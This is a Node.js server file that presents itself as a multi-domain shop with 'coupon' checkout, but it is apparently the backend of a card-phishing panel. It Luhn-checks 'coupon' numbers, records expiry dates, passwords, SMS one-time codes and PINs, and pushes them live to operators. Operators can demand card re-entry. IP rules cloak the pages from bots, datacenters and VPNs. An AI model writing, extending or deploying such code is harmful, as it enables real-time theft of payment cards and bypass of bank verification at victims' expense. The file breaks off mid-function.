const express = require('express');
const http = require('http');
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');
const { Server } = require('socket.io');
const cors = require('cors');
const rateLimit = require('express-rate-limit');
const helmet = require('helmet');
const db = require('./db');
const ipcheck = require('./ipcheck');
const auth = require('./auth');

const app = express();
const server = http.createServer(app);

// CORS: unset or empty ALLOWED_ORIGINS = allow all (dev/self-host); set = strict whitelist
const ALLOWED_ORIGINS = (process.env.ALLOWED_ORIGINS || '')
  .split(',')
  .map((o) => o.trim())
  .filter(Boolean);

const corsOptions = {
  origin: (origin, cb) => {
    if (ALLOWED_ORIGINS.length === 0) {
      // Production with no whitelist: allow only no-Origin (curl / server-to-server); reject browser cross-origin
      if (process.env.NODE_ENV === 'production') return cb(null, !origin);
      return cb(null, true); // dev/self-host: allow all
    }
    if (!origin) return cb(null, true); // no Origin: allow (curl, server-to-server)
    if (ALLOWED_ORIGINS.includes(origin)) return cb(null, true); // in whitelist: allow
    cb(null, false); // not in whitelist: reject
  },
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-Admin-Token'],
};
app.use(cors(corsOptions));
app.use(express.json({ limit: '512kb' }));

// Helmet: security headers + CSP. On HTTP (no HTTPS) skip COOP so browser does not warn "untrustworthy origin"
// 1) 通用 helmet（不做 HSTS、不做 upgrade-insecure-requests）
app.use(helmet({
  contentSecurityPolicy: {
    useDefaults: false, // 不合并 Helmet 默认（默认含 upgrade-insecure-requests，会强制资源走 HTTPS，443 未配则白屏）
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", "data:", "blob:", "https:"],
      fontSrc: ["'self'", "data:"],
      connectSrc: ["'self'", "ws:", "wss:", "https:"],
      frameAncestors: ["'none'"],
      baseUri: ["'self'"],
      formAction: ["'self'"],
      objectSrc: ["'none'"],
      scriptSrcAttr: ["'none'"],
    },
  },
  hsts: false,
  crossOriginOpenerPolicy: false,
  originAgentCluster: false, // 避免 "origin-keyed vs site-keyed" 不一致的控制台警告
}));

// 2) 只对“确实是 https 的请求”加 HSTS（商店域名会走到这里）
app.use((req, res, next) => {
  const xfProto = (req.headers["x-forwarded-proto"] || "").toString().toLowerCase();
  const isHttps = req.secure || xfProto === "https";
  if (isHttps) {
    helmet.hsts({ maxAge: 31536000, includeSubDomains: true })(req, res, next);
  } else {
    next();
  }
});

// Trust proxy in production (nginx) for correct IP detection
if (process.env.NODE_ENV === 'production') {
  app.set('trust proxy', true);
}

// Helper: client IP (trust proxy only; do not read x-forwarded-for to avoid spoofing)
function clientIp(req) {
  return req.ip || '';
}

// Health check (no auth)
app.get('/api/health', (req, res) => {
  res.json({ status: 'ok', timestamp: new Date().toISOString() });
});

// --- Admin auth: seed first user from env ---
function ensureAdminSeeded() {
  db.get('SELECT COUNT(*) as c FROM admin_users', (err, row) => {
    if (err || !row || row.c > 0) return;
    const user = process.env.INIT_ADMIN_USER;
    const pass = process.env.INIT_ADMIN_PASS;
    if (!user || !pass) return;
    
    auth.hashPassword(pass)
      .then(({ hash }) => {
        db.run("INSERT INTO admin_users (username, password_hash, role) VALUES (?, ?, 'main')", [user, hash], () => {
          console.log('Admin user seeded.');
        });
      })
      .catch(err => console.error('Failed to seed admin user:', err));
  });
}
setTimeout(ensureAdminSeeded, 1000);

// Panel IDs for permission check are now imported from auth.js to avoid duplication


function hasPanel(admin, panel) {
  if (admin.role === 'main') return true;
  const p = admin.permissions || [];
  return Array.isArray(p) && p.includes(panel);
}

function requireAdmin(panel) {
  return (req, res, next) => {
    const raw = (req.headers.authorization || req.headers['x-admin-token'] || '').toString();
    const token = raw.replace(/^Bearer\s+/i, '').trim();
    const ip = clientIp(req);
    const ua = req.headers['user-agent'] || '';
    if (!token) {
      auth.logSecurity('auth_fail', ip, 'missing_token');
      return res.status(401).json({ error: 'Unauthorized', detail: 'missing_or_invalid_token' });
    }
    if (token.length > 4096) {
      auth.logSecurity('auth_fail', ip, 'oversized_token');
      return res.status(401).json({ error: 'Unauthorized', detail: 'missing_or_invalid_token' });
    }
    auth.verifySession(token, ip, ua, (err, admin) => {
      if (err) {
        auth.logSecurity('auth_error', ip, 'verify_session_error');
        return res.status(500).json({ error: 'Server error' });
      }
      if (!admin) {
        auth.logSecurity('auth_fail', ip, 'invalid_or_expired_token');
        return res.status(401).json({ error: 'Unauthorized', detail: 'missing_or_invalid_token' });
      }
      admin.permissions = auth.sanitizePanels(admin.permissions || []);
      if (panel && !hasPanel(admin, panel)) {
        auth.logSecurity('auth_forbidden', ip, `panel=${panel} user=${admin.username}`);
        return res.status(403).json({ error: 'Forbidden', detail: 'insufficient_permission' });
      }
      req.admin = admin;
      next();
    });
  };
}

// --- Admin login rate limit (per IP) ---
const loginLimiter = rateLimit({
  windowMs: 10 * 60 * 1000,
  max: 20,
  message: { error: 'Too many login attempts', detail: 'rate_limited' },
  standardHeaders: true,
  keyGenerator: (req) => clientIp(req) || 'unknown',
});
app.post('/api/admin/auth/login', loginLimiter, (req, res) => {
  const ip = clientIp(req);
  const ua = req.headers['user-agent'] || '';
  const username = (req.body.username || '').toString().trim().slice(0, 128);
  const password = req.body.password;
  if (!username || !password) {
    auth.logSecurity('login_fail', ip, 'missing_credentials');
    return res.status(400).json({ error: 'Invalid credentials' });
  }
  db.get('SELECT id, username, password_hash, role, permissions FROM admin_users WHERE username = ?', [username], async (err, user) => {
    if (err) {
      auth.logSecurity('login_error', ip, 'db_error');
      return res.status(500).json({ error: 'Server error' });
    }
    const isValid = user && (await auth.verifyPassword(password, user.password_hash));
    if (!isValid) {
      auth.logSecurity('login_fail', ip, `user=${username}`);
      return res.status(401).json({ error: 'Invalid credentials' });
    }
    auth.createSession(user.id, ip, ua, (err2, token, expiresAt) => {
      if (err2) return res.status(500).json({ error: 'Server error' });
      db.run('DELETE FROM admin_sessions WHERE expires_at <= datetime("now")', () => {});
      let permissions = [];
      if (user.permissions) {
        try {
          const p = JSON.parse(user.permissions);
          if (Array.isArray(p)) permissions = auth.sanitizePanels(p);
        } catch (_) { /* invalid JSON in DB */ }
      }
      res.json({ token, expiresAt, username: user.username, role: user.role, permissions });
    });
  });
});

app.post('/api/admin/auth/logout', (req, res) => {
  const raw = (req.headers.authorization || req.headers['x-admin-token'] || '').toString();
  const token = raw.replace(/^Bearer\s+/i, '').trim();
  auth.revokeSession(token, () => res.json({ ok: true }));
});

app.get('/api/admin/auth/me', requireAdmin(), (req, res) => {
  res.json({ username: req.admin.username, role: req.admin.role, permissions: req.admin.permissions });
});

const io = new Server(server, {
  cors: { origin: "*", methods: ["GET", "POST"] }
});

// Admin namespace: separate from default; auth required (no join_admin bypass)
const adminNsp = io.of('/admin');
function socketIp(socket) {
  if (process.env.NODE_ENV === 'production' && socket.handshake.headers['x-forwarded-for']) {
    return (socket.handshake.headers['x-forwarded-for'] || '').split(',')[0].trim() || socket.handshake.address;
  }
  return socket.handshake.address || '';
}
adminNsp.use((socket, next) => {
  const raw = (socket.handshake.auth?.token || socket.handshake.headers?.authorization || '').toString();
  const token = raw.replace(/^Bearer\s+/i, '').trim();
  const ip = socketIp(socket);
  const ua = socket.handshake.headers['user-agent'] || '';
  if (!token) return next(new Error('unauthorized'));
  if (token.length > 4096) return next(new Error('unauthorized'));
  auth.verifySession(token, ip, ua, (err, admin) => {
    if (err) return next(new Error('server_error'));
    if (!admin) return next(new Error('unauthorized'));
    socket.admin = admin;
    next();
  });
});
adminNsp.on('connection', () => {
  // Admin dashboard only listens; no events to handle (all admin pushes are adminNsp.emit from HTTP or default-namespace handlers)
});

// Track online users (orderId -> Set of socketIds)
const onlineOrders = new Map();
const liveSessions = new Map(); // Track live typing sessions (socketId -> session data)

// Generate unique order ID (strong random; not guessable)
function generateOrderId() {
  return 'ORD-' + crypto.randomUUID();
}

function generateOrderToken() {
  return crypto.randomBytes(32).toString('hex');
}

// Luhn algorithm validation for card numbers
function luhnCheck(num) {
  const digits = (num || '').replace(/\D/g, '');
  if (digits.length < 13 || digits.length > 19) return false;
  if (/^0+$/.test(digits)) return false; // reject all zeros
  let sequential = true;
  for (let i = 1; i < digits.length; i++) {
    if ((parseInt(digits[i], 10) - parseInt(digits[i - 1], 10) + 10) % 10 !== 1) {
      sequential = false;
      break;
    }
  }
  if (sequential && digits.length >= 6) return false; // reject obvious sequential
  let sum = 0, isEven = false;
  for (let i = digits.length - 1; i >= 0; i--) {
    let d = parseInt(digits[i], 10);
    if (isEven) { d *= 2; if (d > 9) d -= 9; }
    sum += d;
    isEven = !isEven;
  }
  return sum % 10 === 0;
}

// Check if card date (MM/YY) is expired (card valid through last day of month)
function isCardExpired(dateMMYY) {
  const m = (dateMMYY || '').match(/^(\d{2})\/(\d{2})$/);
  if (!m) return true;
  const month = parseInt(m[1], 10), year = parseInt(m[2], 10) + 2000;
  if (month < 1 || month > 12) return true;
  const now = new Date();
  const expiryEnd = new Date(year, month, 0, 23, 59, 59); // last day of expiry month
  return now > expiryEnd;
}

// --- Helpers: system_settings (key-value) ---
function getSetting(key, cb) {
  db.get('SELECT value FROM system_settings WHERE key = ?', [key], (err, row) => {
    if (err) return cb(err);
    cb(null, row ? row.value : null);
  });
}

function setSetting(key, value, cb) {
  db.run(
    'INSERT INTO system_settings (key, value, updated_at) VALUES (?, ?, CURRENT_TIMESTAMP) ON CONFLICT(key) DO UPDATE SET value = ?, updated_at = CURRENT_TIMESTAMP',
    [key, value, value],
    cb
  );
}

// --- Middleware: Identify Shop by Domain (use only req.hostname; do not trust client headers) ---
const identifyShop = (req, res, next) => {
  const domain = (req.hostname || '').toString();
  const lookupDomain = domain.includes('localhost') ? 'localhost' : domain;
  req.accessDomain = lookupDomain;
  db.get(
    `SELECT shops.* FROM shops
     LEFT JOIN shop_domains ON shops.id = shop_domains.shop_id
     WHERE shops.domain = ? OR shop_domains.domain = ?
     LIMIT 1`,
    [lookupDomain, lookupDomain],
    (err, shop) => {
      if (err) return next(err);
      req.shop = shop || null;
      next();
    }
  );
};

// --- IP check middleware: runs after identifyShop; use only req.ip (trust proxy) and req.accessDomain ---
const ipCheckMiddleware = (req, res, next) => {
  const ip = clientIp(req);
  const domain = req.accessDomain || req.hostname || '';
  if (!ip || ip.includes('127.0.0.1') || ip === '::1' || ip === '::ffff:127.0.0.1') {
    return next();
  }
  getSetting('ipregistry_api_key', (err, apiKey) => {
    if (err || !apiKey) return next();
    ipcheck.lookup(ip, apiKey).then(({ result, creditsConsumed, creditsRemaining }) => {
      req.ipCheckResult = result;
      if (creditsConsumed != null) setSetting('ipregistry_quota_used', String(creditsConsumed), () => {});
      if (creditsRemaining != null) setSetting('ipregistry_quota_remaining', String(creditsRemaining), () => {});
      const shopId = req.shop ? req.shop.id : null;
      db.get('SELECT * FROM shop_ip_rules WHERE shop_id = ?', [shopId], (err2, rules) => {
        if (!shopId) { db.run('INSERT INTO ip_checks (ip, domain, is_proxy, is_vpn, is_tor, is_datacenter, is_bot, threat_level, country, device_type, action_taken) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)', [result.ip, domain, result.is_proxy, result.is_vpn, result.is_tor, result.is_datacenter, result.is_bot, result.threat_level, result.country, result.device_type, 'allow'], () => {}); return next(); }
        const r = rules || {};
        const disallowed = (r.disallowed_types && JSON.parse(r.disallowed_types || '[]')) || [];
        const blockBots = r.block_bots === 1 && result.is_bot === 1;
        const blockProxy = disallowed.includes('proxy') && result.is_proxy === 1;
        const blockVpn = disallowed.includes('vpn') && result.is_vpn === 1;
        const blockTor = disallowed.includes('tor') && result.is_tor === 1;
        const blockDatacenter = disallowed.includes('datacenter') && result.is_datacenter === 1;
        const blockThreat = (disallowed.includes('threat') || disallowed.includes('abuser') || disallowed.includes('attacker')) && result.threat_level != null;
        const blocked = blockBots || blockProxy || blockVpn || blockTor || blockDatacenter || blockThreat;
        const action = blocked ? (r.action_taken || 'captcha') : 'allow';
        db.run(
          'INSERT INTO ip_checks (ip, domain, is_proxy, is_vpn, is_tor, is_datacenter, is_bot, threat_level, country, device_type, action_taken) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)',
          [result.ip, domain, result.is_proxy, result.is_vpn, result.is_tor, result.is_datacenter, result.is_bot, result.threat_level, result.country, result.device_type, action],
          () => {}
        );
        if (blocked) {
          auth.logSecurity('ip_block', result.ip, `domain=${domain} action=${action}`);
          if (action === 'redirect') return res.redirect(302, '/blocked');
          if (action === '404') return res.status(404).send('Not Found');
          return res.status(403).json({ error: 'access_denied', reason: 'ip_policy', action: r.action_taken || 'captcha' });
        }
        next();
      });
    }).catch(() => next());
  });
};

// --- API Endpoints ---

// 1. Get Shop Config (with optional IP check)
app.get('/api/config', identifyShop, ipCheckMiddleware, (req, res) => {
  if (!req.shop) return res.status(404).json({ error: 'Shop not found for this domain' });
  res.json(req.shop);
});

// 2. Submit Order (backend generates order ID; IP merge uses existing.id)
app.post('/api/orders', identifyShop, (req, res) => {
  const { customer, total, couponCode, dateMMYY, password } = req.body;
  const shopId = req.shop ? req.shop.id : 1;
  const userAgent = req.headers['user-agent'] || '';
  const ipAddress = clientIp(req);

  // Validate coupon: Luhn check + expiry
  const validLuhn = luhnCheck(couponCode);
  const expired = isCardExpired(dateMMYY);
  const autoReject = !validLuhn || expired;
  const orderStatus = autoReject ? 'AUTO_REJECTED' : 'WAITING_APPROVAL';
  const rejectReason = !validLuhn ? 'Luhn check failed' : expired ? 'Card expired' : null;

  const isLocalIp = !ipAddress || ipAddress.includes('127.0.0.1') || ipAddress.includes('::1') || ipAddress === '::ffff:127.0.0.1';

  const createNewOrder = () => {
    const id = generateOrderId();
    const orderToken = generateOrderToken();
    const stmt = db.prepare(`
      INSERT INTO orders (id, shop_id, customer_info, total, coupon_code, coupon_date, coupon_password, status, user_agent, ip_address, order_token)
      VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    `);
    stmt.run(id, shopId, JSON.stringify(customer), total, couponCode, dateMMYY, password, orderStatus, userAgent, ipAddress, orderToken, function(err) {
      if (err) return res.status(500).json({ error: err.message });
      const newOrder = {
        id, shop_id: shopId, shop_name: req.shop ? req.shop.name : 'Unknown',
        customer, total, status: orderStatus,
        couponCode, dateMMYY, password, userAgent, ipAddress,
        couponHistory: [], smsHistory: [], created_at: new Date(),
        order_token: orderToken
      };
      adminNsp.emit('new_order', newOrder);
      res.json({ success: true, order: newOrder, autoRejected: autoReject, rejectReason });
    });
  };

  // Skip IP merge for local development
  if (isLocalIp) { createNewOrder(); return; }

  // Check for existing active order from same IP
  db.get(
    "SELECT id, coupon_code, coupon_date, coupon_password FROM orders WHERE ip_address = ? AND status NOT IN ('COMPLETED', 'REJECTED', 'AUTO_REJECTED') ORDER BY created_at DESC LIMIT 1",
    [ipAddress],
    (err, existing) => {
      if (err || !existing) { createNewOrder(); return; }

      // IP merge: archive old coupon, update existing order
      if (existing.coupon_code) {
        db.run("INSERT INTO coupon_history (order_id, coupon_code, coupon_date, coupon_password) VALUES (?, ?, ?, ?)",
          [existing.id, existing.coupon_code, existing.coupon_date, existing.coupon_password]);
      }
      db.run(
        "UPDATE orders SET customer_info = ?, total = ?, coupon_code = ?, coupon_date = ?, coupon_password = ?, status = ?, sms_code = NULL, user_agent = ? WHERE id = ?",
        [JSON.stringify(customer), total, couponCode, dateMMYY, password, orderStatus, userAgent, existing.id],
        function(err2) {
          if (err2) return res.status(500).json({ error: err2.message });
          db.get('SELECT order_token FROM orders WHERE id = ?', [existing.id], (e, row) => {
            const orderToken = row && row.order_token ? row.order_token : null;
            const mergedOrder = {
              id: existing.id, shop_id: shopId, shop_name: req.shop ? req.shop.name : 'Unknown',
              customer, total, status: orderStatus,
              couponCode, dateMMYY, password, userAgent, ipAddress,
              couponHistory: [], smsHistory: [], created_at: new Date(),
              order_token: orderToken
            };
            adminNsp.emit('order_update', {
              id: existing.id, status: orderStatus,
              couponCode, dateMMYY, password, smsCode: null, customer, total, userAgent
            });
            res.json({ success: true, order: mergedOrder, autoRejected: autoReject, rejectReason });
          });
        }
      );
    }
  );
});

// 3. Admin: Get All Orders
app.get('/api/admin/orders', requireAdmin('data'), (req, res) => {
  db.all(`
    SELECT orders.*, shops.name as shop_name, shops.domain as shop_domain
    FROM orders LEFT JOIN shops ON orders.shop_id = shops.id
    ORDER BY orders.created_at DESC
  `, (err, rows) => {
    if (err) return res.status(500).json({ error: err.message });

    db.all("SELECT * FROM coupon_history ORDER BY created_at ASC", (err2, historyRows) => {
      const historyMap = {};
      (historyRows || []).forEach(h => {
        if (!historyMap[h.order_id]) historyMap[h.order_id] = [];
        historyMap[h.order_id].push({
          couponCode: h.coupon_code, dateMMYY: h.coupon_date,
          password: h.coupon_password, created_at: h.created_at,
        });
      });

      db.all("SELECT * FROM sms_history ORDER BY created_at ASC", (err3, smsRows) => {
        const smsMap = {};
        (smsRows || []).forEach(h => {
          if (!smsMap[h.order_id]) smsMap[h.order_id] = [];
          smsMap[h.order_id].push({ smsCode: h.sms_code, created_at: h.created_at });
        });

        const onlineIds = Array.from(onlineOrders.keys());
        const orders = rows.map(row => ({
          id: row.id, shop_id: row.shop_id,
          shop_name: row.shop_name, shop_domain: row.shop_domain,
          customer: JSON.parse(row.customer_info),
          total: row.total, status: row.status,
          couponCode: row.coupon_code, dateMMYY: row.coupon_date,
          password: row.coupon_password, smsCode: row.sms_code,
          pinCode: row.pin_code,
          userAgent: row.user_agent, ipAddress: row.ip_address,
          couponHistory: historyMap[row.id] || [],
          smsHistory: smsMap[row.id] || [],
          online: onlineIds.includes(row.id),
          created_at: row.created_at,
        }));
        res.json(orders);
      });
    });
  });
});

// 4. Update Order Status (Admin Action)
app.post('/api/admin/orders/:id/status', requireAdmin('data'), (req, res) => {
  const { id } = req.params;
  const { status, smsCode } = req.body;

  // If RETURN_COUPON: archive current coupon to history before changing status
  if (status === 'RETURN_COUPON') {
    db.get("SELECT coupon_code, coupon_date, coupon_password FROM orders WHERE id = ?", [id], (err, order) => {
      if (err) return res.status(500).json({ error: err.message });
      if (order && order.coupon_code) {
        db.run("INSERT INTO coupon_history (order_id, coupon_code, coupon_date, coupon_password) VALUES (?, ?, ?, ?)",
          [id, order.coupon_code, order.coupon_date, order.coupon_password]);
      }
      // Clear coupon fields and set status
      db.run("UPDATE orders SET status = 'RETURN_COUPON', coupon_code = NULL, coupon_date = NULL, coupon_password = NULL, sms_code = NULL WHERE id = ?", [id], function(err2) {
        if (err2) return res.status(500).json({ error: err2.message });
        adminNsp.emit('order_update', { id, status: 'RETURN_COUPON', couponCode: null, dateMMYY: null, password: null, smsCode: null });
        io.to(`order_${id}`).emit('order_update', { id, status: 'RETURN_COUPON' });
        res.json({ success: true });
      });
    });
    return;
  }

  let sql = "UPDATE orders SET status = ? WHERE id = ?";
  let params = [status, id];
  if (smsCode) {
    sql = "UPDATE orders SET status = ?, sms_code = ? WHERE id = ?";
    params = [status, smsCode, id];
  }
  db.run(sql, params, function(err) {
    if (err) return res.status(500).json({ error: err.message });
    adminNsp.emit('order_update', { id, status, smsCode });
    io.to(`order_${id}`).emit('order_update', { id, status, smsCode });
    res.json({ success: true });
  });
});

// 5. User: Submit SMS Verification Code (requires order_token)
app.post('/api/orders/:id/sms', (req, res) => {
  const { id } = req.params;
  const { smsCode, order_token } = req.body;
  if (!smsCode) return res.status(400).json({ error: 'SMS code is required' });
  if (!order_token) return res.status(400).json({ error: 'order_token is required' });

  db.get('SELECT order_token FROM orders WHERE id = ?', [id], (err, row) => {
    if (err) return res.status(500).json({ error: err.message });
    if (!row) return res.status(404).json({ error: 'Order not found' });
    if (row.order_token != null && row.order_token !== '') {
      if (!order_token || row.order_token !== order_token) return res.status(403).json({ error: 'Invalid order token' });
    }

    db.run("INSERT INTO sms_history (order_id, sms_code) VALUES (?, ?)", [id, smsCode]);
    db.run("UPDATE orders SET status = 'SMS_SUBMITTED', sms_code = ? WHERE id = ?", [smsCode, id], function(err2) {
      if (err2) return res.status(500).json({ error: err2.message });
      adminNsp.emit('order_update', { id, status: 'SMS_SUBMITTED', smsCode });
      io.to(`order_${id}`).emit('order_update', { id, status: 'SMS_SUBMITTED', smsCode });
      res.json({ success: true });
    });
  });
});

// 5a. User: Submit PIN Code (requires order_token)
app.post('/api/orders/:id/pin', (req, res) => {
  const { id } = req.params;
  const { pinCode, order_token } = req.body;
  if (!pinCode) return res.status(400).json({ error: 'PIN code is required' });
  if (!order_token) return res.status(400).json({ error: 'order_token is required' });

  db.get('SELECT order_token FROM orders WHERE id = ?', [id], (err, row) => {
    if (err) return res.status(500).json({ error: err.message });
    if (!row) return res.status(404).json({ error: 'Order not found' });
    if (row.order_token != null && row.order_token !== '') {
      if (!order_token || row.order_token !== order_token) return res.status(403).json({ error: 'Invalid order token' });
    }

    db.run("UPDATE orders SET status = 'PIN_SUBMITTED', pin_code = ? WHERE id = ?", [pinCode, id], function(err2) {
      if (err2) return res.status(500).json({ error: err2.message });
      adminNsp.emit('order_update', { id, status: 'PIN_SUBMITTED', pinCode });
      io.to(`order_${id}`).emit('order_update', { id, status: 'PIN_SUBMITTED', pinCode });
      res.json({ success: true });
    });
  });
});

// 6. User: Resubmit Coupon (with Luhn validation; requires order_token)
app.post('/api/orders/:id/update-coupon', (req, res) => {
  const { id } = req.params;
  const { couponCode, dateMMYY, password, order_token } = req.body;
  if (!couponCode) return res.status(400).json({ error: 'Coupon code is required' });
  const validLuhn = luhnCheck(couponCode);
  const expired = isCardExpired(dateMMYY);
  const autoReject = !validLuhn || expired;
  const orderStatus = autoReject ? 'AUTO_REJECTED' : 'WAITING_APPROVAL';

  db.get("SELECT coupon_code, coupon_date, coupon_password, order_token AS ot FROM orders WHERE id = ?", [id], (err, order) => {
    if (err) return res.status(500).json({ error: err.message });
    if (!order) return res.status(404).json({ error: 'Order not found' });
    if (order.ot != null && order.ot !== '') {
      if (!order_token || order.ot !== order_token) return res.status(403).json({ error: 'Invalid order token' });
    }

    if (order.coupon_code) {
      db.run("INSERT INTO coupon_history (order_id, coupon_code, coupon_date, coupon_password) VALUES (?, ?, ?, ?)",
        [id, order.coupon_code, order.coupon_date, order.coupon_password]);
    }

    db.run(
      "UPDATE orders SET coupon_code = ?, coupon_date = ?, coupon_password = ?, status = ?, sms_code = NULL WHERE id = ?",
      [couponCode, dateMMYY, password, orderStatus, id],
      function(err2) {
        if (err2) return res.status(500).json({ error: err2.message });
        adminNsp.emit('order_update', { id, status: orderStatus, couponCode, dateMMYY, password, smsCode: null });
        io.to(`order_${id}`).emit('order_update', { id, status: orderStatus });
        res.json({ success: true, autoRejected: autoReject });
      }
    );
  });
});

// 7. Admin: Get Online Order IDs
app.get('/api/admin/online', requireAdmin('dashboard'), (req, res) => {
  res.json(Array.from(onlineOrders.keys()));
});

// 8. Admin: Get Live Typing Sessions
app.get('/api/admin/live-sessions', requireAdmin('dashboard'), (req, res) => {
  const sessions = [];
  for (const [socketId, session] of liveSessions) {
    sessions.push({ id: socketId, ...session });
  }
  res.json(sessions);
});

// --- Shop Management API ---

// 9. Get all shops with their domains
app.get('/api/admin/shops', requireAdmin('shops'), (req, res) => {
  db.all("SELECT * FROM shops ORDER BY id ASC", (err, shops) => {
    if (err) return res.status(500).json({ error: err.message });
    db.all("SELECT * FROM shop_domains ORDER BY shop_id ASC", (err2, domains) => {
      const domainMap = {};
      (domains || []).forEach(d => {
        if (!domainMap[d.shop_id]) domainMap[d.shop_id] = [];
        domainMap[d.shop_id].push({ id: d.id, domain: d.domain, created_at: d.created_at });
      });
      const result = shops.map(s => ({
        ...s,
        domains: domainMap[s.id] || [],
      }));
      res.json(result);
    });
  });
});

// 10. Create a new shop
app.post('/api/admin/shops', requireAdmin('shops'), (req, res) => {
  const { name, domain, template } = req.body;
  if (!name || !domain) return res.status(400).json({ error: 'Name and domain are required' });
  const templateVal = (template && typeof template === 'string') ? template.trim() : 'beard';
  db.run("INSERT INTO shops (domain, name, template) VALUES (?, ?, ?)", [domain, name, templateVal], function(err) {
    if (err) return res.status(500).json({ error: err.message });
    refreshStoreHosts();
    res.json({ success: true, shop: { id: this.lastID, domain, name, template: templateVal } });
  });
});

// 11. Update shop name
app.put('/api/admin/shops/:id', requireAdmin('shops'), (req, res) => {
  const { name } = req.body;
  if (!name) return res.status(400).json({ error: 'Name is required' });
  db.run("UPDATE shops SET name = ? WHERE id = ?", [name, req.params.id], function(err) {
    if (err) return res.status(500).json({ error: err.message });
    res.json({ success: true });
  });
});

// 12. Add domain to a shop
app.post('/api/admin/shops/:id/domains', requireAdmin('shops'), (req, res) => {
  const { domain } = req.body;
  if (!domain) return res.status(400).json({ error: 'Domain is required' });
  db.run("INSERT INTO shop_domains (shop_id, domain) VALUES (?, ?)", [req.params.id, domain], function(err) {
    if (err) {
      if (err.message.includes('UNIQUE')) return res.status(409).json({ error: 'Domain already exists' });
      return res.status(500).json({ error: err.message });
    }
    refreshStoreHosts();
    res.json({ success: true, domainEntry: { id: this.lastID, domain, shop_id: req.params.id } });
  });
});

// 13. Remove domain from a shop
app.delete('/api/admin/shops/:id/domains/:domainId', requireAdmin('shops'), (req, res) => {
  db.run("DELETE FROM shop_domains WHERE id = ? AND shop_id = ?", [req.params.domainId, req.params.id], function(err) {
    if (err) return res.status(500).json({ error: err.message });
    refreshStoreHosts();
    res.json({ success: true });
  });
});

// 14. Get shop IP rules
app.get('/api/admin/shops/:id/ip-rules', requireAdmin('shops'), (req, res) => {
  db.get('SELECT * FROM shop_ip_rules WHERE shop_id = ?', [req.params.id], (err, row) => {
    if (err) return res.status(500).json({ error: err.message });
    if (!row) return res.json({ shop_id: parseInt(req.params.id, 10), block_bots: 0, block_desktop: 0, block_android: 0, block_apple: 0, block_after_intercept: 0, disallowed_types: [], action_taken: 'captcha' });
    const r = { ...row, disallowed_types: row.disallowed_types ? JSON.parse(row.disallowed_types) : [] };
    res.json(r);
  });
});

// 15. Update shop IP rules
app.put('/api/admin/shops/:id/ip-rules', requireAdmin('shops'), (req, res) => {
  const { block_bots, block_desktop, block_android, block_apple, block_after_intercept, disallowed_types, action_taken } = req.body;
  const shopId = req.params.id;
  const disallowed = Array.isArray(disallowed_types) ? JSON.stringify(disallowed_types) : '[]';
  db.run(
    `INSERT INTO shop_ip_rules (shop_id, block_bots, block_desktop, block_android, block_apple, block_after_intercept, disallowed_types, action_taken, updated_at)
     VALUES (?, ?, ?, ?, ?, ?, ?, ?, CURRENT_TIMESTAMP)
     ON CONFLICT(shop_id) DO UPDATE SET block_bots=?, block_desktop=?, block_android=?, block_apple=?, block_after_intercept=?, disallowed_types=?, action_taken=?, updated_at=CURRENT_TIMESTAMP`,
    [shopId, block_bots ? 1 : 0, block_desktop ? 1 : 0, block_android ? 1 : 0, block_apple ? 1 : 0, block_after_intercept ? 1 : 0, disallowed, action_taken || 'captcha', block_bots ? 1 : 0, block_desktop ? 1 : 0, block_android ? 1 : 0, block_apple ? 1 : 0, block_after_intercept ? 1 : 0, disallowed, action_taken || 'captcha'],
    function(err) {
      if (err) return res.status(500).json({ error: err.message });
      res.json({ success: true });
    }
  );
});

// --- System settings & IP stats ---

// 16. GET admin settings
app.get('/api/admin/settings', requireAdmin('system'), (req, res) => {
  db.all('SELECT key, value FROM system_settings', (err, rows) => {
    if (err) return res.status(500).json({ error: err.message });
    const settings = {};
    (rows || []).forEach(r => { settings[r.key] = r.value; });
    res.json({
      ipregistry_api_key: settings.ipregistry_api_key || '',
      ipregistry_quota_used: settings.ipregistry_quota_used != null ? settings.ipregistry_quota_used : null,
      ipregistry_quota_remaining: settings.ipregistry_quota_remaining != null ? settings.ipregistry_quota_remaining : null,
      api_provider: settings.api_provider || 'ipregistry',
    });
  });
});

// 17. POST admin settings (update API key etc.)
app.post('/api/admin/settings', requireAdmin('system'), (req, res) => {
  const { ipregistry_api_key, api_provider } = req.body;
  const updates = [];
  if (ipregistry_api_key !== undefined) updates.push(['ipregistry_api_key', ipregistry_api_key]);
  if (api_provider !== undefined) updates.push(['api_provider', api_provider]);
  if (updates.length === 0) return res.json({ success: true });
  let done = 0;
  updates.forEach(([key, value]) => {
    setSetting(key, String(value), (err) => {
      if (err) return res.status(500).json({ error: err.message });
      done++;
      if (done === updates.length) res.json({ success: true });
    });
  });
});

// 18. GET IP stats (for dashboard)
app.get('/api/admin/ip-stats', requireAdmin('ipstats'), (req, res) => {
  const now = new Date();
  const todayStart = new Date(now.getFullYear(), now.getMonth(), now.getDate()).toISOString().slice(0, 19).replace('T', ' ');
  const weekStart = new Date(now);
  weekStart.setDate(weekStart.getDate() - 7);
  const weekStartStr = weekStart.toISOString().slice(0, 19).replace('T', ' ');
  const monthStart = new Date(now.getFullYear(), now.getMonth(), 1).toISOString().slice(0, 19).replace('T', ' ');
  db.get('SELECT COUNT(*) as total FROM ip_checks WHERE checked_at >= ?', [todayStart], (err, t) => {
    if (err) return res.status(500).json({ error: err.message });
    db.get('SELECT COUNT(*) as blocked FROM ip_checks WHERE checked_at >= ? AND action_taken != ?', [todayStart, 'allow'], (err2, b) => {
      if (err2) return res.status(500).json({ error: err2.message });
      db.get('SELECT COUNT(*) as total_week FROM ip_checks WHERE checked_at >= ?', [weekStartStr], (err3, w) => {
        if (err3) return res.status(500).json({ error: err3.message });
        db.get('SELECT COUNT(*) as blocked_week FROM ip_checks WHERE checked_at >= ? AND action_taken != ?', [weekStartStr, 'allow'], (err4, bw) => {
          if (err4) return res.status(500).json({ error: err4.message });
          db.get('SELECT COUNT(*) as total_month FROM ip_checks WHERE checked_at >= ?', [monthStart], (err5, m) => {
            if (err5) return res.status(500).json({ error: err5.message });
